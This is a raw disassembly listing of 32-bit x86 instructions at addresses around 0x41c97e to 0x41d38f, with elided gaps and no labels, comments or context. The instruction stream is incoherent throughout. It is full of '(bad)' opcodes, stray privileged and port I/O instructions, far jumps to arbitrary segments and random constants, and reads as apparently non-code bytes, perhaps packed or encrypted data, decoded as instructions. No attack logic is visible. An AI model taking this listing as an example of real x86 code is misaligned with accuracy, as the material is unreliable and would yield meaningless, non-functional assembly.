  41c97e:	jnp    0x41c9ec
  41c980:	icebp  
  41c981:	mov    esi,0xfc6dedb4
  41c986:	mov    ch,dl
  41c988:	div    bh
  41c98a:	push   edi
  41c98b:	jmp    0x7ab8:0x437e85c
  41c992:	adc    edx,esp
  41c994:	mov    al,ds:0xf6d5de2d
  41c999:	stos   DWORD PTR es:[edi],eax
  41c99a:	xlat   BYTE PTR ds:[ebx]
  41c99b:	je     0x41c940
  41c99d:	dec    ebx
  41c99e:	call   0x65c6:0x9abf08b6
  41c9a5:	cwde   
  41c9a6:	inc    BYTE PTR [edx-0x3e]
  41c9a9:	or     ah,BYTE PTR [ebx-0x71]
  41c9ac:	xor    edi,DWORD PTR [edx+edi*8+0x584085df]
  41c9b3:	fwait
  41c9b4:	cli    
  41c9b5:	and    ch,BYTE PTR ds:0x45ceb5ca
  41c9bb:	inc    edi
  41c9bc:	pusha  
  41c9bd:	or     ah,BYTE PTR [ebx]
  41c9bf:	xchg   edx,eax
  41c9c0:	sub    BYTE PTR [ecx+eiz*2+0x2e654c76],bl
  41c9c7:	jns    0x41c9ac
  41c9c9:	das    
  41c9ca:	pop    edx
  41c9cb:	adc    ah,BYTE PTR [bx+si-0x3c97]
  41c9d0:	dec    edx
  41c9d1:	inc    esp
  41c9d2:	mov    ah,0xe7
  41c9d4:	pop    ds
  41c9d5:	add    ecx,eax
  41c9d7:	inc    edi
  41c9d8:	cmp    al,0xf3
  41c9da:	mov    ecx,0x461b426f
  41c9df:	xor    bl,BYTE PTR [ecx]
  41c9e1:	retf   
  41c9e2:	icebp  
  41c9e3:	imul   DWORD PTR [ecx]
  41c9e5:	ficomp DWORD PTR [ebx+0x3c]
  41c9e8:	outs   dx,DWORD PTR ds:[esi]
  41c9e9:	mov    al,0xa6
  41c9eb:	xor    ah,BYTE PTR [eax+0xc85babd]
  41c9f1:	xchg   DWORD PTR [ebx-0x5b],ebx
  41c9f4:	jle    0x41ca72
  41c9f6:	fs hlt 
  41c9f8:	pop    esi
  41c9f9:	lods   al,BYTE PTR ds:[esi]
  41c9fa:	arpl   WORD PTR ds:[eax+esi*2-0x3978dc13],sp
  41ca02:	sub    BYTE PTR [eax],ah
  41ca04:	sub    eax,0xff4791c0
  41ca09:	shl    DWORD PTR [edx+ecx*8+0x22a58df0],0x0
	...
  41ca71:	add    BYTE PTR [eax],al
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	(bad)  
  41ca81:	out    dx,al
  41ca82:	cmp    DWORD PTR [edi+0x13050],ecx
  41ca88:	add    al,0x1
  41ca8a:	add    BYTE PTR [eax],al
  41ca8c:	xchg   ebx,eax
  41ca8d:	jnp    0x41ca98
  41ca8f:	sbb    esi,ebp
  41ca91:	push   ebx
  41ca92:	dec    ecx
  41ca94:	push   ss
  41ca95:	and    ebp,DWORD PTR [edi-0x66f16507]
  41ca9b:	std    
  41ca9c:	inc    ebx
  41ca9d:	lods   eax,DWORD PTR ds:[esi]
  41ca9e:	and    BYTE PTR ds:0x9bf5d188,ah
  41caa4:	push   edi
  41caa5:	pop    eax
  41caa6:	std    
  41caa7:	adc    esi,DWORD PTR [esi+eax*8+0x7148dcdd]
  41caae:	dec    esp
  41caaf:	mov    edi,0x900a0815
  41cab4:	out    0x0,eax
  41cab6:	(bad)  
  41cab7:	aas    
  41cab8:	mov    bh,0xca
  41caba:	out    dx,al
  41cabb:	cdq    
  41cabc:	div    BYTE PTR [edx-0x59b14005]
  41cac2:	gs (bad) 
  41cac4:	aam    0x85
  41cac6:	nop
  41cac7:	sbb    bl,bh
  41cac9:	out    0xf1,eax
  41cacb:	fbstp  TBYTE PTR [edi-0x18db4efd]
  41cad1:	inc    BYTE PTR [esi-0x10]
  41cad4:	psubd  mm6,mm6
  41cad7:	or     al,0xdc
  41cad9:	sbb    BYTE PTR [edx-0x31673759],bh
  41cadf:	mov    ebp,0x5f4d7282
  41cae4:	and    DWORD PTR [eax-0x7bb8dbb],esp
  41caea:	scas   eax,DWORD PTR es:[edi]
  41caeb:	adc    BYTE PTR [ebp+0x49],ch
  41caee:	and    eax,0xcf83a915
  41caf3:	sbb    BYTE PTR [edx],al
  41caf5:	cmp    eax,0xb771201
  41cafa:	test   ebp,ecx
  41cafc:	sar    bl,cl
  41cafe:	mov    ah,0x83
  41cb00:	in     al,dx
  41cb01:	add    eax,0xe93bae97
  41cb06:	cmp    BYTE PTR [edx],cl
  41cb08:	fdivp  st(1),st
  41cb0a:	fld    DWORD PTR [edi+0x38ab12a7]
  41cb10:	jbe    0x41cac1
  41cb12:	repz fs out dx,eax
  41cb15:	mov    edx,0x6d628021
  41cb1a:	xchg   BYTE PTR [edi],ch
  41cb1c:	(bad)  
  41cb1d:	call   0x13a38a19
  41cb22:	loopne 0x41cb5e
  41cb24:	push   0x4b
  41cb26:	mov    edi,DWORD PTR [ebp-0x7b]
  41cb29:	mov    eax,ds:0xd2adbd14
  41cb2e:	sub    al,0x93
  41cb30:	xchg   edi,eax
  41cb31:	fwait
  41cb32:	inc    edx
  41cb33:	or     al,0xe7
  41cb35:	and    BYTE PTR [esp+edi*1-0x53],dh
  41cb39:	pop    ebp
  41cb3a:	pop    esi
  41cb3b:	ja     0x41cad2
  41cb3d:	jae    0x41cb9c
  41cb3f:	lods   al,BYTE PTR ds:[esi]
  41cb40:	mov    ah,0x64
  41cb42:	call   0x7179496f
  41cb47:	mov    dl,BYTE PTR [eax+esi*1]
  41cb4a:	inc    ebp
  41cb4b:	jl     0x41cb0b
  41cb4d:	ficomp DWORD PTR [eax-0x4b]
  41cb50:	pop    edx
  41cb51:	cmp    al,0xcb
  41cb53:	push   es
  41cb54:	push   ebx
  41cb55:	xor    dh,BYTE PTR [eax]
  41cb57:	cmc    
  41cb58:	lea    ecx,[ebp-0x784c052]
  41cb5e:	adc    eax,ecx
  41cb60:	out    dx,eax
  41cb61:	push   ds
  41cb62:	test   eax,0xe2500e42
  41cb67:	mov    esp,0xcbea3121
  41cb6c:	(bad)  
  41cb6e:	pop    eax
  41cb6f:	jge    0x41cb19
  41cb71:	cmp    al,0x39
  41cb73:	cmp    al,BYTE PTR [eax+0x45fd22a]
  41cb79:	xchg   edx,eax
  41cb7a:	push   ebp
  41cb7b:	or     DWORD PTR [esi-0x3c],ecx
  41cb7e:	xchg   edi,eax
  41cb7f:	mov    ds:0xeb37dc2d,eax
  41cb84:	cwde   
  41cb85:	jge    0x41cbdf
  41cb87:	mov    al,0x80
  41cb89:	mov    al,ds:0x89f83da6
  41cb8e:	sbb    eax,0x8
	...
  41cbf3:	add    BYTE PTR [ecx],ch
  41cbf5:	(bad)  
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0xfbce0e22
  41cc03:	inc    edx
  41cc04:	push   esp
  41cc05:	xor    DWORD PTR [ecx],eax
  41cc07:	add    BYTE PTR [ecx+eax*1],al
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	dec    ebp
  41cc0d:	push   esi
  41cc0e:	pop    ebp
  41cc0f:	stc    
  41cc10:	das    
  41cc11:	dec    esi
  41cc12:	mov    ds:0xc443d8cc,al
  41cc17:	cmc    
  41cc18:	ror    dl,cl
  41cc1a:	ret    0x55cb
  41cc1d:	test   DWORD PTR ds:0x107e36a8,esi
  41cc23:	scas   al,BYTE PTR es:[edi]
  41cc24:	lea    esp,[edx]
  41cc26:	mov    ebx,0x6cc2c286
  41cc2b:	mov    ah,0x66
  41cc2d:	sbb    al,BYTE PTR [ecx-0x442bcb1b]
  41cc33:	ror    DWORD PTR [eax],0x88
  41cc36:	mov    cs,WORD PTR [ebx+ecx*1-0x631f7b2f]
  41cc3d:	mov    ebx,ecx
  41cc3f:	imul   edx,ecx,0x2a
  41cc42:	xchg   esp,eax
  41cc43:	mov    dl,0x33
  41cc45:	out    0xc7,al
  41cc47:	sub    ebp,DWORD PTR [ebx-0x14a5e067]
  41cc4d:	rcr    eax,1
  41cc4f:	pop    edx
  41cc50:	or     esi,DWORD PTR [esi+0x16]
  41cc53:	cmp    DWORD PTR ss:[esi-0x1dd2e1ac],edx
  41cc5a:	push   edx
  41cc5b:	cmp    bh,BYTE PTR [ebx]
  41cc5d:	popa   
  41cc5e:	(bad)  
  41cc5f:	gs ret 
  41cc61:	hlt    
  41cc62:	ror    DWORD PTR [esp+esi*8],cl
  41cc65:	jmp    0x41cc37
  41cc67:	imul   ebx,DWORD PTR [ebp+0x49]
  41cc6b:	fs push es
  41cc6d:	push   es
  41cc6e:	push   0x94e275cf
  41cc73:	jns    0x41cc11
  41cc75:	pop    esp
  41cc76:	js     0x41cc32
  41cc78:	dec    edx
  41cc79:	in     al,0xce
  41cc7b:	cmp    ch,BYTE PTR [ecx+0x372c53d3]
  41cc81:	dec    esp
  41cc82:	add    DWORD PTR [esi-0x53d71167],eax
  41cc88:	push   ss
  41cc89:	fild   QWORD PTR [esi]
  41cc8b:	xchg   ebx,eax
  41cc8c:	fidivr WORD PTR [edx]
  41cc8e:	(bad)  
  41cc8f:	push   eax
  41cc90:	dec    esi
  41cc91:	xor    al,0x12
  41cc93:	stos   DWORD PTR es:[edi],eax
  41cc94:	xor    dh,dl
  41cc96:	xchg   ebx,eax
  41cc97:	xchg   BYTE PTR [edx-0x61571dc1],bl
  41cc9d:	xchg   DWORD PTR [eax+edi*4],ecx
  41cca0:	mov    cl,0x87
  41cca2:	imul   ebp,edx,0x1d
  41cca5:	or     ecx,DWORD PTR ds:0x3ec1d550
  41ccab:	adc    ebp,DWORD PTR [ecx]
  41ccad:	push   eax
  41ccae:	ins    DWORD PTR es:[edi],dx
  41ccaf:	cmp    ebp,DWORD PTR [edi+0x66]
  41ccb2:	inc    eax
  41ccb3:	int3   
  41ccb4:	in     al,dx
  41ccb5:	fwait
  41ccb6:	mov    edx,0x28103633
  41ccbb:	pop    es
  41ccbc:	(bad)  
  41ccbd:	pop    ebx
  41ccbe:	mov    ds:0xa040f48a,al
  41ccc3:	je     0x41cc64
  41ccc5:	jo     0x41ccaa
  41ccc7:	mov    ebx,DWORD PTR ds:0x9e7d174a
  41cccd:	aad    0xd8
  41cccf:	push   0x39
  41ccd1:	aam    0xb4
  41ccd3:	xchg   edi,eax
  41ccd4:	cmp    eax,0xcfe5b95a
  41ccd9:	mov    cl,0xcd
  41ccdb:	sti    
  41ccdc:	fcom   QWORD PTR [ebx+edx*2+0x4b11e99f]
  41cce3:	fwait
  41cce4:	es es mov esi,0xfa4e67df
  41cceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccec:	inc    edi
  41cced:	gs jno 0x41cd60
  41ccf0:	inc    ecx
  41ccf1:	mov    DWORD PTR [edi-0x7f17d3ae],eax
  41ccf7:	(bad)  
  41ccf8:	cmp    al,0xaa
  41ccfa:	jnp    0x41cd78
  41ccfc:	mov    edi,0xe53c9c08
  41cd01:	loopne 0x41ccd3
  41cd03:	xor    BYTE PTR [edi+0x562c7e4d],cl
  41cd09:	das    
  41cd0a:	sub    DWORD PTR [edi+0x602aec3c],esp
	...
  41cd74:	pusha  
  41cd75:	cdq    
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	repz xor al,0x90
  41cd83:	in     al,0x58
  41cd85:	xor    al,BYTE PTR [ecx]
  41cd87:	add    BYTE PTR [ecx+eax*1],al
  41cd8a:	add    BYTE PTR [eax],al
  41cd8c:	jnp    0x41ce01
  41cd8e:	dec    ebx
  41cd8f:	neg    BYTE PTR [ebp+0x2a3756db]
  41cd95:	xor    eax,0xe75fb7aa
  41cd9a:	cmp    BYTE PTR [edi],al
  41cd9c:	adc    eax,0x639e51fa
  41cda1:	ja     0x41cdb4
  41cda3:	cmp    ch,ah
  41cda5:	out    dx,eax
  41cda6:	sub    eax,0xe49b1713
  41cdab:	or     bl,bh
  41cdad:	lock movs WORD PTR es:[edi],WORD PTR ds:[esi]
  41cdb0:	dec    edx
  41cdb1:	fs cld 
  41cdb3:	clc    
  41cdb4:	lahf   
  41cdb5:	dec    edx
  41cdb6:	mov    bl,0x5b
  41cdb8:	add    DWORD PTR [ebx-0x3fd545ef],edx
  41cdbe:	or     eax,0xdf9d9213
  41cdc3:	retf   0x2861
  41cdc6:	mov    esp,DWORD PTR [edi]
  41cdc8:	sub    al,0x85
  41cdca:	(bad)
  41cdcd:	outs   dx,BYTE PTR ds:[esi]
  41cdce:	jl     0x41cd9d
  41cdd0:	adc    esi,eax
  41cdd2:	mov    ?,esi
  41cdd4:	inc    ebp
  41cdd5:	outs   dx,DWORD PTR ds:[esi]
  41cdd6:	push   ss
  41cdd7:	shl    DWORD PTR [eax+ebx*2-0x66585019],1
  41cdde:	inc    edi
  41cddf:	test   al,0x0
  41cde1:	sub    DWORD PTR [edi-0x7e2aa116],eax
  41cde7:	sbb    cl,BYTE PTR [ecx+edi*1]
  41cdea:	pop    ebx
  41cdeb:	cdq    
  41cdec:	and    DWORD PTR [esp-0x75ff8607],eax
  41cdf3:	(bad)  
  41cdf4:	test   al,0xe5
  41cdf6:	daa    
  41cdf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdf8:	mov    al,0x34
  41cdfa:	fadd   DWORD PTR [esi]
  41cdfc:	fild   WORD PTR [ecx]
  41cdfe:	push   edx
  41cdff:	xor    BYTE PTR [esi+0x15],ah
  41ce02:	fcom   st(2)
  41ce04:	sbb    al,0xa6
  41ce06:	(bad)  
  41ce07:	retf   0xa13d
  41ce0a:	push   ebp
  41ce0b:	jge    0x41cdba
  41ce0d:	inc    ecx
  41ce0e:	jne    0x41ce10
  41ce10:	sbb    BYTE PTR [edx],cl
  41ce12:	ins    DWORD PTR es:[edi],dx
  41ce13:	add    DWORD PTR [eax],edx
  41ce15:	adc    DWORD PTR [ecx+0x22e63bb4],esi
  41ce1b:	mov    dh,BYTE PTR [ecx]
  41ce1d:	fistp  DWORD PTR [edx+edx*8-0x160416c2]
  41ce24:	arpl   WORD PTR [eax-0x71],dx
  41ce27:	inc    ebp
  41ce28:	sub    BYTE PTR [ebp-0x1d],bh
  41ce2b:	ret    0xb857
  41ce2e:	xor    eax,0x62df0b9d
  41ce33:	enter  0x70d4,0xd2
  41ce37:	pop    ds
  41ce38:	ret    0x1e1
  41ce3b:	mov    BYTE PTR [esi-0x467e350e],dl
  41ce41:	and    esi,ebp
  41ce43:	ret    
  41ce44:	fstp   DWORD PTR [ecx+eax*2+0x36]
  41ce48:	xchg   ebp,eax
  41ce49:	pop    ebp
  41ce4a:	out    dx,eax
  41ce4b:	sub    bh,BYTE PTR [edi+ebp*4-0x58891c72]
  41ce52:	or     ecx,DWORD PTR [edi-0x55cf9fe1]
  41ce58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce59:	cmp    ecx,DWORD PTR [ebx]
  41ce5b:	ror    ebx,cl
  41ce5d:	pop    esi
  41ce5e:	data16 jecxz 0x41ce31
  41ce61:	pusha  
  41ce62:	aaa    
  41ce63:	fsub   QWORD PTR [edx+0x617d1d2b]
  41ce69:	xor    al,0xde
  41ce6b:	mov    WORD PTR [ecx+eax*2],es
  41ce6e:	push   ebx
  41ce6f:	jmp    0x41ce83
  41ce71:	repz (bad) 
  41ce73:	pop    ecx
  41ce74:	out    0x69,eax
  41ce76:	rcr    BYTE PTR [eax+edi*1+0x6ae7f542],0x5f
  41ce7e:	fs jp  0x41cebb
  41ce81:	xor    DWORD PTR [esi+0x6d],edx
  41ce84:	(bad)  
  41ce85:	sbb    eax,0xdacc0fdd
  41ce8a:	xchg   BYTE PTR [eax],al
  41ce8c:	pusha  
  41ce8d:	mul    DWORD PTR [edi+0xe6]
	...
  41cef3:	add    BYTE PTR [edi],al
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	(bad)  
  41cf01:	adc    esi,edx
  41cf03:	cmp    ebx,DWORD PTR [ebx+esi*1+0x1]
  41cf07:	add    BYTE PTR [ecx+eax*1],al
  41cf0a:	add    BYTE PTR [eax],al
  41cf0c:	outs   dx,DWORD PTR ds:[esi]
  41cf0d:	rcl    ch,1
  41cf0f:	mov    ch,0x80
  41cf11:	push   ebx
  41cf12:	test   al,0x4d
  41cf14:	add    al,0x9
  41cf16:	xchg   ecx,eax
  41cf17:	jmp    0x95c95a9f
  41cf1c:	lahf   
  41cf1d:	and    eax,0x5cee5e8c
  41cf22:	inc    ebx
  41cf23:	scas   eax,DWORD PTR es:[edi]
  41cf24:	jne    0x41cf42
  41cf26:	int3   
  41cf27:	pop    es
  41cf28:	sahf   
  41cf29:	inc    eax
  41cf2a:	jns    0x41cecb
  41cf2c:	rcl    DWORD PTR [eax],0x9b
  41cf2f:	jns    0x41cf95
  41cf31:	out    dx,eax
  41cf32:	and    esp,DWORD PTR [esp+eiz*8-0x29]
  41cf36:	push   eax
  41cf37:	mov    ebp,0x22998a58
  41cf3c:	es ret 
  41cf3e:	aaa    
  41cf3f:	out    0xda,al
  41cf41:	or     ebp,esi
  41cf43:	xchg   esi,eax
  41cf44:	xor    ah,BYTE PTR [edi+0x3e]
  41cf47:	jnp    0x41cf59
  41cf49:	ror    eax,0x1f
  41cf4c:	popf   
  41cf4d:	outs   dx,DWORD PTR ds:[esi]
  41cf4e:	inc    edx
  41cf4f:	xor    bh,al
  41cf51:	mov    dh,0x88
  41cf53:	retf   0xbb82
  41cf56:	adc    DWORD PTR [eax-0x53],ebx
  41cf59:	rol    DWORD PTR [ebp-0x60d8706c],0x2f
  41cf60:	or     ah,BYTE PTR [ecx+0x4e]
  41cf63:	inc    edx
  41cf64:	mov    bl,0x15
  41cf66:	div    BYTE PTR [ebp-0x6f]
  41cf69:	dec    ebx
  41cf6a:	or     BYTE PTR [esi-0x26],dl
  41cf6d:	in     al,dx
  41cf6e:	inc    ebx
  41cf6f:	cmc    
  41cf70:	push   esi
  41cf71:	push   ds
  41cf72:	mov    al,ds:0xb1936a85
  41cf77:	sub    eax,0x6f730701
  41cf7c:	fcmovne st,st(6)
  41cf7e:	push   ds
  41cf7f:	adc    DWORD PTR [edx-0x60],0xaa3defed
  41cf86:	popf   
  41cf87:	jae    0x41cf1c
  41cf89:	scas   eax,DWORD PTR es:[edi]
  41cf8a:	adc    sp,WORD PTR [edx]
  41cf8d:	adc    eax,0xc54b9134
  41cf92:	dec    ebp
  41cf93:	mov    ds:0xe5f2c94e,al
  41cf98:	push   ebx
  41cf99:	loopne 0x41cfa6
  41cf9b:	bound  ebp,QWORD PTR [ebx+edx*4]
  41cf9e:	xlat   BYTE PTR ds:[ebx]
  41cf9f:	dec    ebp
  41cfa0:	cmp    DWORD PTR [ebx+eax*4+0x53ea9fd2],0x674bb7a
  41cfab:	mov    edi,0xac9935dc
  41cfb0:	push   ecx
  41cfb1:	push   edi
  41cfb2:	call   DWORD PTR [esi-0x318e6cf7]
  41cfb8:	fs cmp eax,0x74c6f810
  41cfbe:	daa    
  41cfbf:	jp     0x41cf7f
  41cfc1:	idiv   BYTE PTR ds:0x2deb7588
  41cfc7:	mov    eax,DWORD PTR [eax+0x32]
  41cfca:	repz (bad)
  41cfcd:	gs leave 
  41cfcf:	arpl   WORD PTR [ebx],bx
  41cfd1:	add    ebp,DWORD PTR [esi-0x3b]
  41cfd4:	pusha  
  41cfd5:	inc    esi
  41cfd6:	sub    eax,edx
  41cfd8:	inc    edx
  41cfd9:	jecxz  0x41d048
  41cfdb:	das    
  41cfdc:	push   ecx
  41cfdd:	mov    ebp,0xf19c430d
  41cfe2:	sub    DWORD PTR [ecx-0x17],eax
  41cfe5:	push   cs
  41cfe6:	loope  0x41cf7d
  41cfe8:	xchg   BYTE PTR [edi+0x20e35a53],bh
  41cfee:	push   es
  41cfef:	mov    ds:0xcfb8e6e1,eax
  41cff4:	enter  0xe4b8,0xf5
  41cff8:	fs jb  0x41cfab
  41cffb:	and    BYTE PTR [eax+0x6437475b],0x7c
  41d002:	inc    ecx
  41d003:	xchg   esp,eax
  41d004:	cmp    BYTE PTR [di-0x4d],0xac
  41d009:	in     al,dx
  41d00a:	dec    ebx
  41d00b:	cmp    eax,0x99ced4d7
	...
  41d074:	mov    ecx,0xad432034
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x570c2fbd
  41d083:	add    BYTE PTR [eax+0x34],ah
  41d086:	add    DWORD PTR [eax],eax
  41d088:	add    al,0x1
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	xchg   ebp,eax
  41d08d:	ds mov ch,0x58
  41d090:	mov    bh,0x2e
  41d092:	sub    esi,DWORD PTR [edx+0x3eb007f3]
  41d098:	mov    ebx,0xf181fd7a
  41d09d:	ret    0xfe9e
  41d0a0:	sub    eax,eax
  41d0a2:	xchg   edx,eax
  41d0a3:	dec    ebx
  41d0a4:	sub    al,0xcc
  41d0a6:	in     eax,0xb0
  41d0a8:	push   edx
  41d0a9:	loop   0x41d11f
  41d0ab:	jp     0x41d0e9
  41d0ad:	ins    BYTE PTR es:[edi],dx
  41d0ae:	(bad)  
  41d0b0:	dec    ebx
  41d0b1:	push   ds
  41d0b2:	mov    ds:0xd137796e,eax
  41d0b7:	mov    dh,0xc7
  41d0b9:	sub    BYTE PTR [edi-0x470e00b3],0xac
  41d0c0:	or     edi,esi
  41d0c2:	push   0x3316d231
  41d0c7:	or     BYTE PTR [edi-0x1eeeed40],dh
  41d0cd:	and    edx,DWORD PTR [edi-0x18]
  41d0d0:	xor    BYTE PTR [eax],0xe3
  41d0d3:	sahf   
  41d0d4:	lahf   
  41d0d5:	je     0x41d114
  41d0d7:	and    BYTE PTR ds:[esi+0x3c4a7fcd],bh
  41d0de:	cwde   
  41d0df:	lods   al,BYTE PTR ds:[esi]
  41d0e0:	out    0xe7,eax
  41d0e2:	mov    ah,0x75
  41d0e4:	out    0xc1,al
  41d0e6:	add    al,0x7a
  41d0e8:	push   ecx
  41d0e9:	in     eax,dx
  41d0ea:	mov    edx,0xbb375716
  41d0ef:	stc    
  41d0f0:	push   edx
  41d0f1:	jno    0x41d16c
  41d0f3:	sub    al,0x6d
  41d0f5:	xor    dl,BYTE PTR [ecx+0x16]
  41d0f8:	jne    0x41d155
  41d0fa:	fst    st(6)
  41d0fc:	or     cl,ah
  41d0fe:	jae    0x41d0f7
  41d100:	stos   DWORD PTR es:[edi],eax
  41d101:	arpl   WORD PTR [ebx],ax
  41d103:	push   ss
  41d104:	push   es
  41d105:	hlt    
  41d106:	mov    al,ds:0x33f15ed5
  41d10b:	sbb    eax,0x2e77a0f6
  41d110:	popf   
  41d111:	adc    BYTE PTR [ecx],bl
  41d113:	jmp    0x2322492e
  41d118:	inc    esi
  41d119:	push   es
  41d11a:	daa    
  41d11b:	add    ecx,eax
  41d11d:	xchg   ebx,eax
  41d11e:	dec    ebx
  41d11f:	mov    ebx,0x74af833
  41d124:	mov    esi,DWORD PTR [ebx-0xc]
  41d127:	dec    ebx
  41d128:	repz ss sub eax,0x7ff446cc
  41d12f:	add    DWORD PTR [ecx],eax
  41d131:	fs push 0xffffffb7
  41d134:	jle    0x41d10d
  41d136:	in     al,0xe7
  41d138:	addr16 into 
  41d13a:	aas    
  41d13b:	out    0x14,eax
  41d13d:	push   ebp
  41d13e:	popf   
  41d13f:	dec    edi
  41d140:	or     eax,0xc45de5d0
  41d145:	sbb    ebx,DWORD PTR ds:[ebp-0x4]
  41d149:	and    esi,DWORD PTR [ecx-0x439564e1]
  41d14f:	(bad)  
  41d150:	cli    
  41d151:	sti    
  41d152:	xchg   esp,eax
  41d153:	sbb    ah,ch
  41d155:	jmp    0x235b3a2b
  41d15a:	jp     0x41d15c
  41d15c:	mov    edx,gs
  41d15e:	mov    ch,0xbb
  41d160:	sub    BYTE PTR [ecx+eax*8-0x17eaf955],0x8f
  41d168:	pop    esp
  41d169:	fist   WORD PTR [ebx]
  41d16b:	mov    WORD PTR [edi-0x6da46fa1],ds
  41d171:	push   cs
  41d172:	inc    esp
  41d173:	xlat   BYTE PTR ds:[ebx]
  41d174:	loope  0x41d1a8
  41d176:	xchg   esp,eax
  41d177:	cmp    al,0x9c
  41d179:	push   esp
  41d17a:	pop    edi
  41d17b:	aaa    
  41d17c:	ins    BYTE PTR es:[edi],dx
  41d17d:	push   eax
  41d17e:	and    eax,0x8783069d
  41d183:	sbb    al,0x55
  41d185:	mov    esi,0x67b246f9
  41d18a:	jns    0x41d184
  41d18c:	pop    eax
  41d18d:	mov    BYTE PTR [edx+0x65],ah
	...
  41d1f4:	push   eax
  41d1f5:	ret    
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	jge    0x41d187
  41d202:	(bad)  
  41d203:	sub    esp,DWORD PTR [ebp+esi*1+0x1]
  41d207:	add    BYTE PTR [ecx+eax*1],al
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	les    esp,FWORD PTR [ebp-0x67af195a]
  41d212:	jg     0x41d212
  41d214:	lock (bad) 
  41d216:	xlat   BYTE PTR ds:[ebx]
  41d217:	into   
  41d218:	jae    0x41d288
  41d21a:	jle    0x41d298
  41d21c:	std    
  41d21d:	xor    eax,0x3969a963
  41d222:	fist   DWORD PTR [ebp+0x11]
  41d225:	es es mov esi,0x5f08f36f
  41d22c:	push   ecx
  41d22d:	add    BYTE PTR [esi+0x53],cl
  41d230:	add    ebx,DWORD PTR [edi+0x6c714c43]
  41d236:	div    DWORD PTR [edi]
  41d238:	push   ecx
  41d239:	adc    BYTE PTR [edi],ch
  41d23b:	xchg   edx,eax
  41d23c:	(bad)  
  41d23d:	jb     0x41d225
  41d23f:	push   cs
  41d240:	test   dh,dl
  41d242:	test   dh,0x4e
  41d245:	push   es
  41d246:	out    0x14,al
  41d248:	pop    esp
  41d249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d24a:	push   cs
  41d24b:	iret   
  41d24c:	cmp    edi,eax
  41d24e:	adc    DWORD PTR [ebx+0x41d2038d],eax
  41d254:	mov    esp,0x8e24c53c
  41d259:	inc    ebp
  41d25a:	mov    edx,0x68fd342e
  41d25f:	jmp    0x7cb5:0x74912ce
  41d266:	int    0x10
  41d268:	data16 icebp 
  41d26a:	xor    bl,BYTE PTR [ebx-0x12cadeeb]
  41d270:	loope  0x41d26f
  41d272:	sahf   
  41d273:	aad    0xe6
  41d275:	mov    eax,ds:0xde69fe56
  41d27a:	mov    al,0xd3
  41d27c:	jmp    0x41d2de
  41d27e:	mov    edx,0x4145a9d9
  41d283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d284:	stos   DWORD PTR es:[edi],eax
  41d285:	and    edx,DWORD PTR [ebx]
  41d287:	lock imul eax,DWORD PTR [edi-0x6e],0x1f
  41d28c:	ins    BYTE PTR es:[edi],dx
  41d28d:	inc    esi
  41d28e:	pop    esi
  41d28f:	das    
  41d290:	xchg   esi,eax
  41d291:	neg    DWORD PTR [edx]
  41d293:	daa    
  41d294:	ins    BYTE PTR es:[edi],dx
  41d295:	jecxz  0x41d2e5
  41d297:	cli    
  41d298:	fisubr DWORD PTR [edi-0x40]
  41d29b:	mov    ebx,0xac5c252e
  41d2a0:	imul   ebp,DWORD PTR cs:0x4ff9fdc8,0xffffffb4
  41d2a8:	mov    ebx,0x64ff323e
  41d2ad:	jg     0x41d2c6
  41d2af:	ret    
  41d2b0:	adc    esi,DWORD PTR [esi]
  41d2b2:	jo     0x41d280
  41d2b4:	retf   
  41d2b5:	loope  0x41d2bf
  41d2b7:	int    0xf3
  41d2b9:	lds    ecx,FWORD PTR [edx]
  41d2bb:	mov    eax,0x22589f4c
  41d2c0:	mov    al,ds:0x4c51a76e
  41d2c5:	add    eax,0x3f89b948
  41d2ca:	pop    ss
  41d2cb:	ror    BYTE PTR [ebp+0x1015d6ce],cl
  41d2d1:	or     DWORD PTR [esi+0x2e9979b8],ebp
  41d2d7:	pop    eax
  41d2d8:	xchg   bh,al
  41d2da:	jo     0x41d30c
  41d2dc:	or     ch,BYTE PTR [edx+0x78135a81]
  41d2e2:	push   ebx
  41d2e3:	(bad)  
  41d2e4:	mov    ebp,0xe78e2320
  41d2e9:	sub    DWORD PTR [ebx+0x33],ecx
  41d2ec:	leave  
  41d2ed:	and    edi,edi
  41d2ef:	lods   eax,DWORD PTR ds:[esi]
  41d2f0:	add    al,0x24
  41d2f2:	or     esi,DWORD PTR [ecx+0x26e6dc78]
  41d2f8:	mov    esi,0x25872c25
  41d2fd:	outs   dx,DWORD PTR ds:[esi]
  41d2fe:	mov    eax,0x4062dd3a
  41d303:	dec    esp
  41d304:	mov    ah,BYTE PTR [ecx+0x55]
  41d307:	fnstcw WORD PTR [ebp+0x3f0db73b]
  41d30d:	test   eax,0x9ada
	...
  41d372:	add    BYTE PTR [eax],al
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	mov    ecx,0x68693308
  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    al,0x1
  41d38a:	add    BYTE PTR [eax],al
  41d38c:	retf   
  41d38d:	out    0x2,al
  41d38f:	xor    BYTE PTR [eax],dl
